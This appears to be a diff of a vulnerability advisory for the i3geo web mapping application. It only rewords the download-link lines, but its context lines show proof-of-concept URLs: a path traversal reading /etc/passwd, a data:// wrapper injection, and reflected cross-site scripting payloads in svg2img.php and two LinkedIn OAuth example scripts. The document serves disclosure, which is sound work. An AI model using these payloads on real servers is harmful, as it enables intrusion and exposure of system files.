@@ -10,7 +10,7 @@ To exploit vulnerability:
 - http://.../i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd
 - http://.../i3geo/exemplos/codemirror.php?&pagina=data://text/plain;base64,SEFDS0VE
 
-You can download it from the link below:
+To download i3geo:
 - https://softwarepublico.gov.br/social/i3geo
 - https://github.com/edmarmoretti/i3geo
 - https://github.com/saladesituacao/i3geo
@@ -31,7 +31,7 @@ The vulnerability is a XSS (Cross Site Scripting) or HTML Injection in svg2img.p
 To exploit vulnerability:
 - http://.../i3geo/pacotes/svg2img.php?w=%3C/script%3E%3Cscript%3Ealert(%22HACKED%22)%3C/script%3E%3C!--
 
-You can download it from the link below:
+To download i3geo:
 - https://softwarepublico.gov.br/social/i3geo
 - https://github.com/edmarmoretti/i3geo
 - https://github.com/saladesituacao/i3geo
@@ -52,7 +52,7 @@ The vulnerability is a XSS (Cross Site Scripting) or HTML Injection in access_to
 To exploit vulnerability:
 - http://.../i3geo/pacotes/linkedinoauth/example/access_token.php?=%22%3E%3Cscript%3Ealert(%22HACKED%22)%3C/script%3E%3C!--
 
-You can download it from the link below:
+To download i3geo:
 - https://softwarepublico.gov.br/social/i3geo
 - https://github.com/edmarmoretti/i3geo
 - https://github.com/saladesituacao/i3geo
@@ -73,7 +73,7 @@ The vulnerability is a XSS (Cross Site Scripting) or HTML Injection in request_t
 To exploit vulnerability:
 - http://.../i3geo/pacotes/linkedinoauth/example/request_token.php?=%22%3E%3Cscript%3Ealert(%22HACKED%22)%3C/script%3E%3C!--
 
-You can download it from the link below:
+To download i3geo:
 - https://softwarepublico.gov.br/social/i3geo
 - https://github.com/edmarmoretti/i3geo
 - https://github.com/saladesituacao/i3geo
